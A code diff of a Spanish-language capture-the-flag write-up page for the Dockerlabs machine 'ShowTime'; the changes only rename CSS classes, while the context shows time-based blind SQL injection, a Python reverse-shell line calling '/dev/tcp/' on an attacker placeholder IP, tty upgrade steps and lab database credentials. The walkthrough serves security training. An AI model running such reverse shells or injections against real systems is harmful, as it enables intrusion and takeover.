@@ -6,8 +6,8 @@
     <title>S31sh1r0</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
     <link rel="stylesheet" href="https://n4g1h4ck.github.io/css/prism.css">
-    <link rel="stylesheet" href="https://n4g1h4ck.github.io/css/tools_writeups.css">
-    <link rel="stylesheet" href="https://n4g1h4ck.github.io/css/writeup_article.css">
+    <link rel="stylesheet" href="https://n4g1h4ck.github.io/css/articles_general.css">
+    <link rel="stylesheet" href="https://n4g1h4ck.github.io/css/article.css">
 </head>
 <body>
     <header class="header">
@@ -22,21 +22,21 @@
             <h3 class="index">Índice</h3>
             <div class="platforms">
                 <h4 class="dockerlabs">Dockerlabs</h4>
-                <ul class="list_sidebar">
+                <ul class="list_articles">
                     <li><a href="https://n4g1h4ck.github.io/DL/showtime/showtime.html">HackZones</a></li>
                     <li><a href="https://n4g1h4ck.github.io/dl/showtime.html">ShowTime</a></li>
                 </ul>
                 <h4 class="hackthebox">Hackthebox</h4>
-                <ul class="list_writeups">
+                <ul class="list_articles">
                 </ul>
             </div>
         </asíde>
 
         <main class="content">
-            <article class="writeup">
-                <h2 class="writeup_title">ShowTime</h2>
-                <h2 class="writeup_platform">Plataforma: <span class="dl">Dockerlabs</span></h2>
-                <h3 class="writeup_subtitle">Fase de Reconocimiento</h3>
+            <article class="article">
+                <h2 class="article_title">ShowTime</h2>
+                <h2 class="article_platform">Plataforma: <span class="dl">Dockerlabs</span></h2>
+                <h3 class="article_subtitle">Fase de Reconocimiento</h3>
                 <p class="description">
                     Primero envió un <i>ping</i> a la máquina para saber si tengo conectividad.
                 </p>
@@ -119,7 +119,7 @@ Service detection performed. Please report any incorrect results at https://nmap
                 <p class="description">
                     Al ver que el login es vulnerable a una inyección sql, trataré de probar una <i>inyección SQL ciega basada en tiempo</i>. Puedes utilizar <span class="highlight">SQLMap</span> para esta parte, sin embargo yo prefiero los métodos manuales así que hare unos <i>scripts en python</i> para que me automatice la explotación de la vulnerabilidad. En mis <a target="_blank" href="https://n4g1h4ck.github.io/tools.html" class="highlight">Herramientas</a> estarán los scripts explicados para los que quieran utilizarlos.
                 </p>
-                <h2 class="writeup_subtitle">Inyección SQL ciega basada en tiempo</h2>
+                <h2 class="article_subtitle">Inyección SQL ciega basada en tiempo</h2>
                 <p class="description">
                     Despues de ejecutar el script para determinar el nombre de la base de datos utilizada, me muestra que es <i>users</i>, gracias a este dato puedo utilizar el siguiente script para enumerar las tablas que emplea la base de datos.
                     <br><br>
@@ -148,7 +148,7 @@ os.system('bash -c "bash -i >& /dev/tcp/IP_DE_LA_MAQUINA_ATACANTE/PUERTO_LOCAL 0
                 <p class="description">
                     Estando en una terminal con <i class="highlight">netcat</i> en escucha por el puerto especificado, cuando ejecute el código python, obtendré una reverse shell a mi equipo.
                 </p>
-                <h3 class="writeup_subtitle">Tratamiento de la tty</h3>
+                <h3 class="article_subtitle">Tratamiento de la tty</h3>
                 <p class="description">Empiezo dándome una <i>pseudoconsola</i></p>
                 <pre class="code"><code class="language-ruby">script /dev/null -c bash</code></pre>
                 <p class="description">Ahora presiono en el teclado <i>Ctrl+z</i></p>
@@ -162,7 +162,7 @@ os.system('bash -c "bash -i >& /dev/tcp/IP_DE_LA_MAQUINA_ATACANTE/PUERTO_LOCAL 0
                     <br><br>
                     Entonces, en la terminal donde estaba antes escribo <code class="language-ruby">stty rows 36 columns 140</code> para cambiar las dimensiones, ahora si ejecuto <i class="highlight">nano</i> este tiene las proporciones verdaderas.
                 </p>
-                <h3 class="writeup_subtitle">Escalada de Privilegios</h3>
+                <h3 class="article_subtitle">Escalada de Privilegios</h3>
                 <p class="description">
                    En la ruta <i class="highlight">/var/www/html/login_page</i> existe un archivo <i>db.php</i> que contiene credenciales de una base de datos (<code class="language-php">$conexión=mysqli_connect("127.0.0.1","casino","123321","users");</code>) así que intentaré conectarme para ver que puedo enumerar.
                 </p>
